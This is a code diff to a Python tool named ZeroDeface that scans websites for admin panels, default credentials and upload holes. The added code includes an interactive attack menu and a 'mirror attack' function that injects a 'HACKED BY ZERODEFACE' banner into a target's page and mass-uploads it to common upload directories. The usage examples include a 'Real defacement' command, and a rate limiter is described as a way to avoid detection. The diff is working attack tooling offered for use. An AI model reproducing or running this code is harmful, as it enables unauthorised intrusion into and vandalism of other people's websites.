@@ -232,6 +232,115 @@ __________                 ________          _____
         print("\033[1;37mZeroDeface Ultimate v3.2 - Complete Website Defacement Scanner\033[0m")
         print("\033[1;33mAdvanced CMS Detection | Comprehensive Admin Finder | Enhanced Defacement Tools\033[0m\n")
 
+    def show_menu(self):
+        print("""\033[33m
+█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+█                                     𝗠𝗘𝗡𝗨                                                                    
+█=====================================================================================█
+█ 1.  Scan Entire Website             | 9.  Test File Upload Vulnerabilities          █
+█ 2.  Scan for Admin Panels           | 10. Attempt Defacement                       █
+█ 3.  Crawl Website                   | 11. Mirror Attack Defacement                  █
+█ 4.  Test Default Credentials        | 12. Generate Scan Report                     █
+█ 5.  Scan Other Vulnerabilities      | 13. Cleanup Test Files                       █
+█ 6.  Detect CMS                      | 14. List Discovered URLs                     █  
+█ 7.  Test WebDAV                     | 15. Show Vulnerability Log                   █
+█ 8.  Check Common Files              | 16. Exit                                     █
+█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
+\033[0m""")
+
+    def interactive_mode(self):
+        """Launch interactive menu-driven mode"""
+        self.print_banner()
+        while True:
+            self.show_menu()
+            choice = input("\n\033[1;37mZeroDeface>\033[0m ").strip()
+            
+            if choice == "1":
+                self.scan_entire_site()
+            elif choice == "2":
+                self.scan_admin_panels()
+            elif choice == "3":
+                self.crawl_website()
+            elif choice == "4":
+                if not self.admin_paths:
+                    self.scan_admin_panels()
+                for url in [urljoin(self.target_url, path) for path in self.admin_paths]:
+                    if self.is_login_page(self.session.get(url, verify=False)):
+                        self.test_credentials(url)
+            elif choice == "5":
+                self.scan_other_vulnerabilities()
+            elif choice == "6":
+                response = self.session.get(self.target_url, verify=False)
+                cms = self.detect_cms(response)
+                print(f"[*] Detected CMS: {cms}")
+            elif choice == "7":
+                self.test_webdav()
+            elif choice == "8":
+                self.scan_other_vulnerabilities()
+            elif choice == "9":
+                self.scan_upload_vulnerabilities()
+            elif choice == "10":
+                self.attempt_defacement(self.target_url)
+            elif choice == "11":
+                self.mirror_attack()
+            elif choice == "12":
+                report_file = input("Enter report filename: ").strip()
+                self.generate_report(report_file)
+            elif choice == "13":
+                self.cleanup()
+            elif choice == "14":
+                print("\n".join(self.discovered_urls))
+            elif choice == "15":
+                for vuln in self.vulnerabilities:
+                    print(f"{vuln['category']}: {vuln['description']}")
+            elif choice == "16":
+                print("[*] Exiting ZeroDeface...")
+                break
+            else:
+                print("[-] Invalid choice. Please select 1-16")
+
+    def mirror_attack(self):
+        """Advanced mirroring attack with upload vulnerability exploitation"""
+        try:
+            print("\n[+] Starting Mirror Attack...")
+            
+            # 1. Clone the target page
+            response = self.session.get(self.target_url, verify=False, timeout=15)
+            original_html = response.text
+            
+            # 2. Inject defacement
+            defacement = """
+            <div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:20px;text-align:center;z-index:9999;">
+            HACKED BY ZERODEFACE</div>
+            """
+            modified_html = original_html.replace('</body>', f'{defacement}</body>')
+            
+            # 3. Find upload locations
+            upload_paths = [
+                'wp-content/uploads',
+                'images', 
+                'assets',
+                'files',
+                'media'
+            ]
+            
+            # 4. Mass upload
+            for path in upload_paths:
+                upload_url = urljoin(self.target_url, path + "/index.html")
+                if self.upload_file(upload_url, modified_html):
+                    print(f"[+] Defacement uploaded to: {path}")
+                    self.log_vulnerability(
+                        "Mirror Attack Successful",
+                        f"Deployed mirror defacement to {path}",
+                        exploit=f"Visit {upload_url}",
+                        proof="Full page takeover with persistent overlay"
+                    )
+            return True
+            
+        except Exception as e:
+            print(f"[-] Mirror attack failed: {str(e)}")
+            return False
+
     def rate_limit(self):
         """Enforce rate limiting to avoid detection"""
         elapsed = time.time() - self.last_request_time
@@ -821,6 +930,8 @@ Examples:
   Admin scan:      python deface_scanner.py --url http://example.com --admin --brute
   Upload test:     python deface_scanner.py --url http://example.com --upload --deface --simulate
   Real defacement: python deface_scanner.py --url http://example.com --upload --deface
+  Mirror attack:   python deface_scanner.py --url http://example.com --mirror
+  Interactive:     python deface_scanner.py --url http://example.com --interactive
 \033[0m"""
     )
     
@@ -829,6 +940,7 @@ Examples:
     parser.add_argument('--brute', action='store_true', help='Test default credentials')
     parser.add_argument('--upload', action='store_true', help='Test file upload vulnerabilities')
     parser.add_argument('--deface', action='store_true', help='Attempt defacement if upload is vulnerable')
+    parser.add_argument('--mirror', action='store_true', help='Execute mirror attack defacement')
     parser.add_argument('--simulate', action='store_true', help='Safe simulation mode (no real changes)')
     parser.add_argument('--crawl', action='store_true', help='Crawl the entire site')
     parser.add_argument('--all', action='store_true', help='Run all vulnerability checks')
@@ -838,6 +950,7 @@ Examples:
     parser.add_argument('--threads', type=int, default=5, help='Number of threads for crawling')
     parser.add_argument('--max-pages', type=int, default=100, help='Maximum pages to crawl')
     parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds')
+    parser.add_argument('--interactive', action='store_true', help='Launch interactive menu mode')
     
     global args
     args = parser.parse_args()
@@ -848,25 +961,29 @@ Examples:
 
     try:
         scanner = DefacementScanner(args.url)
-        scanner.print_banner()
         
-        if args.all or args.crawl:
-            scanner.scan_entire_site()
+        if args.interactive:
+            scanner.interactive_mode()
         else:
-            if args.admin:
-                scanner.scan_admin_panels()
-                if args.brute:
-                    pass  # Brute force is handled within scan_admin_panels
-                    
-            if args.upload:
-                scanner.scan_upload_vulnerabilities()
-            
-        if args.report:
-            scanner.generate_report(args.report)
-            
-        if not scanner.vulnerabilities:
-            print("\033[1;32m[+] No vulnerabilities found.\033[0m")
-            
+            scanner.print_banner()
+            if args.all:
+                scanner.scan_entire_site()
+            else:
+                if args.admin or args.brute:
+                    scanner.scan_admin_panels()
+                if args.upload or args.deface:
+                    scanner.scan_upload_vulnerabilities()
+                if args.crawl:
+                    scanner.crawl_website()
+                if args.mirror:
+                    scanner.mirror_attack()
+                
+            if args.report:
+                scanner.generate_report(args.report)
+                
+            if not scanner.vulnerabilities and not args.quiet:
+                print("\033[1;32m[+] No vulnerabilities found.\033[0m")
+                
     except KeyboardInterrupt:
         print("\n\033[1;33m[!] Scan interrupted by user\033[0m")
     except Exception as e:
